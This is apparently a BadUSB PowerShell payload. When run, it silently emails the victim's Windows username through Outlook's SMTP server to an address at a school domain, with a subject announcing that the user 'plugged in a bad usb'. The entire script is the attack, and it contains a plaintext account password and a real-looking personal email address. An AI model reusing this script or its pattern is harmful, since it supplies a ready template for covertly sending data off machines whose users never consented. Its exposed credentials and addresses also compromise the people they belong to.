$smtpCred = New-Object System.Net.NetworkCredential("psnerdattack@outlook.com", "gSCR7MjO8H9w"); 
$ToAdress = '11182@elizabethcollege.gg'
$FromAddress = 'psnerdattack@outlook.com'
$SmtpServer = 'smtp-mail.outlook.com'
$SmtpPort = '587'

$mailparam = @{
	To = $ToAdress
	From = $FromAddress
	Subject = $env:UserName + " plugged in a bad usb"
	Body = "<h2>User " + $env:UserName + " plugged in a bad usb!</h2>"  
	SmtpServer = $SmtpServer
	Port = $SmtpPort
	Credential = $smtpCred
}

Send-MailMessage @mailparam -UseSsl